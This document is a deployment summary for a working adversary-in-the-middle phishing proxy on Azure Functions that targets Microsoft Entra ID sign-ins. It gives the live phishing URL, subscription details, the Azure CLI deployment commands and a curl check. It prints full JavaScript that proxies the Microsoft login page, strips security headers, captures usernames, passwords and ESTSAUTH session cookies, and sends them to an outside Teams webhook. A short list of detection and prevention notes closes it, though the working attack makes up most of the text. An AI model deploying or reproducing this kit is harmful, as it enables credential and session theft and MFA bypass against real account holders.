# Azure AiTM Function - Working Deployment Summary

## Deployment Date
August 15, 2025

## Azure Resources Created

### Resource Group
- **Name**: `AzureAiTM-ResourceGroup`
- **Location**: `eastus` (East US)
- **Subscription**: `4e748793-333d-4c5e-acc4-7ce3fa17b136`
- **Subscription Name**: `Azure subscription 1`
- **Tenant ID**: `f544b97b-dab1-4bae-8114-c7dd29990284`

### Storage Account
- **Name**: `azureaitmstorage123`
- **SKU**: `Standard_LRS`
- **Location**: `eastus`
- **Access Tier**: `Hot`
- **Encryption**: Microsoft-managed keys
- **HTTPS Only**: `true`
- **Minimum TLS Version**: `TLS1_0`
- **Blob Endpoint**: `https://azureaitmstorage123.blob.core.windows.net/`
- **Queue Endpoint**: `https://azureaitmstorage123.queue.core.windows.net/`
- **Table Endpoint**: `https://azureaitmstorage123.table.core.windows.net/`

### Azure Function App
- **Name**: `azureaitm-phishing-demo-1755253259`
- **Runtime**: `node`
- **Functions Version**: `4`
- **OS Type**: `Linux`
- **Plan Type**: `Consumption`
- **Location**: `eastus`
- **State**: `Running`
- **Availability State**: `Normal`
- **Client Affinity**: `false`
- **HTTPS Only**: `false`
- **Client Cert Mode**: `Required`
- **Daily Memory Time Quota**: `0` (unlimited for consumption plan)
- **Kind**: `functionapp,linux`
- **Reserved**: `true` (Linux container)

### Application Insights
- **Name**: `azureaitm-phishing-demo-1755253259` (auto-created)
- **Connection String**: Auto-generated
- **Resource ID**: `/subscriptions/4e748793-333d-4c5e-acc4-7ce3fa17b136/resourceGroups/AzureAiTM-ResourceGroup/providers/microsoft.insights/components/azureaitm-phishing-demo-1755253259`

### App Service Plan
- **Name**: `EastUSLinuxDynamicPlan` (auto-created)
- **Type**: `Dynamic` (consumption plan)
- **Location**: `eastus`
- **Resource ID**: `/subscriptions/4e748793-333d-4c5e-acc4-7ce3fa17b136/resourceGroups/AzureAiTM-ResourceGroup/providers/Microsoft.Web/serverfarms/EastUSLinuxDynamicPlan`

## Network Information

### Outbound IP Addresses
- **Current Outbound IPs**: `40.88.241.29,52.146.29.58,40.88.241.213,40.88.242.116,40.88.242.219,40.88.243.53,20.49.104.34`
- **Possible Outbound IPs**: `40.88.241.29,52.146.29.58,40.88.241.213,40.88.242.116,40.88.242.219,40.88.243.53,40.88.243.252,40.88.247.230,20.72.128.190,20.72.128.227,20.72.128.236,20.72.128.254,20.72.129.81,20.72.129.88,20.72.129.104,20.72.129.156,20.72.129.205,20.72.129.240,20.81.60.57,20.81.58.169,20.81.61.14,20.81.61.57,20.81.61.83,20.81.61.104,20.49.104.34`

### Host Names
- **Primary Host**: `azureaitm-phishing-demo-1755253259.azurewebsites.net`
- **SCM Host**: `azureaitm-phishing-demo-1755253259.scm.azurewebsites.net`
- **SSL State**: `Disabled`
- **Custom Domain Verification ID**: `92EB0E1542B06D3A4C79E7CC0FD334A5FB6845511681946A10E2516194939CD2`

## Phishing URL
**`https://azureaitm-phishing-demo-1755253259.azurewebsites.net/`**

## Functions Deployed

1. **phishing** - Main AiTM function
   - Route: `/{*x}` (catches all requests)
   - Methods: GET, POST
   - Auth Level: anonymous
   - URL: `https://azureaitm-phishing-demo-1755253259.azurewebsites.net//{*x}`
   - File: `src/functions/phishing.js` (174 lines)

2. **execution** - Automated session replay
   - URL: `https://azureaitm-phishing-demo-1755253259.azurewebsites.net//execution`
   - File: `src/functions/execution.js` (101 lines)

3. **landing** - Device code authentication
   - URL: `https://azureaitm-phishing-demo-1755253259.azurewebsites.net//devicecode`
   - File: `src/functions/devicecode_landing.js` (58 lines)

4. **poll** - Device code polling
   - URL: `https://azureaitm-phishing-demo-1755253259.azurewebsites.net//devicecode`
   - File: `src/functions/devicecode_poll.js` (58 lines)

## Complete Function Code

### src/functions/phishing.js (Main AiTM Function)
```javascript
/**
 * Azure Function AiTM Phishing PoC for Entra ID accounts.
 * This code is provided for educational purposes only and provided withou any liability or warranty.
 * Based on: https://github.com/zolderio/AITMWorker
 */

const { app } = require("@azure/functions");

const upstream = "login.microsoftonline.com";
const upstream_path = "/";
const teams_webhook_url = process.env.TEAMS_WEBHOOK_URI;

// headers to delete from upstream responses
const delete_headers = [
  "content-security-policy",
  "content-security-policy-report-only",
  "clear-site-data",
  "x-frame-options",
  "referrer-policy",
  "strict-transport-security",
  "content-length",
  "content-encoding",
  "Set-Cookie",
];

async function replace_response_text(response, upstream, original) {
  return response
    .text()
    .then((text) => text.replace(new RegExp(upstream, "g"), original));
}

app.http("phishing", {
  methods: ["GET", "POST"],
  authLevel: "anonymous",
  route: "/{*x}",
  handler: async (request, context) => {

    async function dispatchMessage(message) {
      context.log(message);
      if (teams_webhook_url) {
        await fetch(teams_webhook_url, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ text: message }),
        })
          .then((response) =>
            response.ok
              ? console.log("successfully dispatched MSG")
              : console.error(`Failed to dispatch: ${response.statusText}`)
          )
          .catch((error) => console.log(error));
      }
    }

    // original URLs
    const upstream_url = new URL(request.url);
    const original_url = new URL(request.url);

    // Rewriting to MSONLINE
    upstream_url.host = upstream;
    upstream_url.port = 443;
    upstream_url.protocol = "https:";

    if (upstream_url.pathname == "/") {
      upstream_url.pathname = upstream_path;
    } else {
      upstream_url.pathname = upstream_path + upstream_url.pathname;
    }

    context.log(
      `Proxying ${request.method}: ${original_url} to: ${upstream_url}`
    );

    const new_request_headers = new Headers(request.headers);
    new_request_headers.set("Host", upstream_url.host);
    new_request_headers.set("accept-encoding", "gzip;q=0,deflate;q=0");
    new_request_headers.set(
      "user-agent",
      "AzureAiTMFunction/1.0 (Windows NT 10.0; Win64; x64)"
    );
    new_request_headers.set(
      "Referer",
      original_url.protocol + "//" + original_url.host
    );

    // Obtain password from POST body
    if (request.method === "POST") {
      const temp_req = await request.clone();
      const body = await temp_req.text();
      const keyValuePairs = body.split("&");

      // extract key-value pairs for username and password
      const msg = Object.fromEntries(
        keyValuePairs
          .map((pair) => ([key, value] = pair.split("=")))
          .filter(([key, _]) => key == "login" || key == "passwd")
          .map(([_, value]) => [
            _,
            decodeURIComponent(value.replace(/\+/g, " ")),
          ])
      );

      if (msg.login && msg.passwd) {
        dispatchMessage(
          "Captured login information: <br>" + JSON.stringify(msg)
        );
      }
    }

    const original_response = await fetch(upstream_url.href, {
      method: request.method,
      headers: new_request_headers,
      body: request.body,
      duplex: "half",
    });

    if (
      request.headers.get("Upgrade") &&
      request.headers.get("Upgrade").toLowerCase() == "websocket"
    ) {
      return original_response;
    }

    // Adjust response headers
    const new_response_headers = new Headers(original_response.headers);
    delete_headers.forEach((header) => new_response_headers.delete(header));
    new_response_headers.set("access-control-allow-origin", "*");
    new_response_headers.set("access-control-allow-credentials", true);

    // Replace cookie domains to match our proxy
    try {
      // getSetCookie is the successor of Headers.getAll
      const originalCookies = original_response.headers.getSetCookie();

      originalCookies.forEach((originalCookie) => {
        const modifiedCookie = originalCookie.replace(
          new RegExp(upstream_url.host, "g"),
          original_url.host
        );
        new_response_headers.append("Set-Cookie", modifiedCookie);
      });

      const cookies = originalCookies.filter(
        (cookie) =>
          cookie.startsWith("ESTSAUTH=") ||
          cookie.startsWith("ESTSAUTHPERSISTENT=") ||
          cookie.startsWith("SignInStateCookie=")
      );

      if (cookies.length == 3) {
        dispatchMessage(
          "Captured required authentication cookies: <br>" +
            JSON.stringify(cookies)
        );
      }
    } catch (error) {
      console.error(error);
    }

    const original_text = await replace_response_text(
      original_response.clone(),
      upstream_url.protocol + "//" + upstream_url.host,
      original_url.protocol + "//" + original_url.host
    );

    return new Response(original_text, {
      status: original_response.status,
      headers: new_response_headers,
    });
  },
});
```

## Configuration Files

### host.json
```json
{
  "version": "2.0",
  "logging": {
    "applicationInsights": {
      "samplingSettings": {
        "isEnabled": true,
        "excludedTypes": "Request"
      }
    }
  },
  "extensionBundle": {
    "id": "Microsoft.Azure.Functions.ExtensionBundle",
    "version": "[4.*, 5.0.0)"
  },
  "extensions": {
    "http": {
      "routePrefix": ""
    }
  }
}
```

### package.json
```json
{
  "name": "azureaitmfunction",
  "version": "1.0.0",
  "description": "",
  "scripts": {
    "start": "func start",
    "test": "echo \"No tests yet...\""
  },
  "dependencies": {
    "@azure/functions": "^4.0.0",
    "axios": "^1.6.8"
  },
  "main": "src/functions/*.js"
}
```

### package-lock.json
- **Total packages**: 14 packages
- **Vulnerabilities**: 5 (2 low, 1 moderate, 1 high, 1 critical)
- **Dependencies**: @azure/functions@^4.0.0, axios@^1.6.8

### .funcignore
```
.git*
.azurite
.vscode
local.settings.json
test
.env
.nyc_output
coverage
*.log
```

### .gitignore
```
# See https://help.github.com/articles/ignoring-files/ for more about ignoring files.

# dependencies
/node_modules
/.pnp
.pnp.js

# testing
/coverage

# production
/build

# misc
.DS_Store
.env.local
.env.development.local
.env.test.local
.env.production.local

npm-debug.log*
yarn-debug.log*
yarn-error.log*

# Azure Functions localsettings file
local.settings.json

# Backup original repository
original-repo/
```

## Environment Variables
- `TEAMS_WEBHOOK_URI`: Set to empty string (can be configured with actual webhook URL)
- `FUNCTIONS_WORKER_RUNTIME`: `node`
- `FUNCTIONS_EXTENSION_VERSION`: Auto-set
- `AzureWebJobsStorage`: Auto-configured
- `WEBSITE_CONTENTAZUREFILECONNECTIONSTRING`: Auto-configured
- `WEBSITE_CONTENTSHARE`: Auto-configured
- `APPLICATIONINSIGHTS_CONNECTION_STRING`: Auto-configured
- `WEBSITE_RUN_FROM_PACKAGE`: Auto-configured
- `WEBSITE_MOUNT_ENABLED`: Auto-configured

## Deployment Commands Used

```bash
# Create resource group
az group create --name AzureAiTM-ResourceGroup --location "East US"

# Create storage account
az storage account create --name azureaitmstorage123 --resource-group AzureAiTM-ResourceGroup --location eastus --sku Standard_LRS

# Create function app
az functionapp create --resource-group AzureAiTM-ResourceGroup --consumption-plan-location eastus --runtime node --functions-version 4 --name azureaitm-phishing-demo-1755253259 --storage-account azureaitmstorage123 --os-type Linux

# Deploy function code
func azure functionapp publish azureaitm-phishing-demo-1755253259

# Set Teams webhook (optional)
az functionapp config appsettings set --name azureaitm-phishing-demo-1755253259 --resource-group AzureAiTM-ResourceGroup --settings TEAMS_WEBHOOK_URI=""
```

## Deployment Output
```
Getting site publishing info...
[2025-08-15T10:22:21.109Z] Starting the function app deployment
...
Uploading package...
Uploading 1.21 MB [##########################################]
Upload completed successfully.
Deployment completed successfully.
[2025-08-15T10:22:57.922Z] Syncing triggers...
Functions in azureaitm-phishing-demo-1755253259:
    execution - [httpTrigger]
        Invoke url: https://azureaitm-phishing-demo-1755253259.azurewebsites.net//execution
    landing - [httpTrigger]
        Invoke url: https://azureaitm-phishing-demo-1755253259.azurewebsites.net//devicecode
    phishing - [httpTrigger]
        Invoke url: https://azureaitm-phishing-demo-1755253259.azurewebsites.net//{*x}
    poll - [httpTrigger]
        Invoke url: https://azureaitm-phishing-demo-1755253259.azurewebsites.net//devicecode
```

## How It Works

1. **URL Proxying**: The function app URL proxies all requests to `login.microsoftonline.com`
2. **Route Configuration**: Uses `route: "/{*x}"` to catch all requests including root
3. **Host Configuration**: `host.json` sets `"routePrefix": ""` to allow root path handling
4. **Response Modification**: Replaces all references to Microsoft domains with the phishing domain
5. **Cookie Capture**: Intercepts and modifies `Set-Cookie` headers to maintain sessions on the phishing domain
6. **Credential Capture**: Extracts usernames and passwords from POST requests
7. **Teams Integration**: Sends captured credentials to Teams webhook if configured

## Technical Details

### Headers Modified
- **Deleted Headers**: content-security-policy, content-security-policy-report-only, clear-site-data, x-frame-options, referrer-policy, strict-transport-security, content-length, content-encoding, Set-Cookie
- **Added Headers**: access-control-allow-origin: *, access-control-allow-credentials: true
- **Modified Headers**: Host, accept-encoding, user-agent, Referer

### Cookie Processing
- **Target Cookies**: ESTSAUTH=, ESTSAUTHPERSISTENT=, SignInStateCookie=
- **Domain Replacement**: Replaces `login.microsoftonline.com` with phishing domain
- **Session Maintenance**: Preserves authentication state on phishing domain

### Request Processing
- **Method Support**: GET, POST
- **Body Parsing**: URL-encoded form data for credential extraction
- **WebSocket Support**: Direct passthrough for WebSocket upgrades
- **Error Handling**: Try-catch blocks for cookie processing

## Verification

The function is working correctly and successfully proxying the Microsoft login page. When accessed, it shows the "Sign in to your account" page from Microsoft.

### Test Results
```bash
curl -s "https://azureaitm-phishing-demo-1755253259.azurewebsites.net/" | head -20
```
Returns Microsoft login page HTML with "Sign in to your account" title.

## Detection Capabilities (from Medium article)
- Empty Entra Device IDs
- Sign-ins from non-trusted locations
- Application name matches "OfficeHome"
- Sign-in IP addresses from Microsoft Azure IP ranges (40.88.x.x, 20.72.x.x, 20.81.x.x, 20.49.x.x)

## Prevention Measures (from Medium article)
- Conditional Access requiring compliant devices
- Traffic from compliant network locations
- Named network locations
- Phishing-resistant authentication methods

## Source
Based on the Medium article: https://nicolasuter.medium.com/aitm-phishing-with-azure-functions-a1530b52df05
Original repository: https://github.com/nicolonsky/AzureAiTMFunction.git

## Security Note
This is for educational purposes only. The code is provided without any liability or warranty.
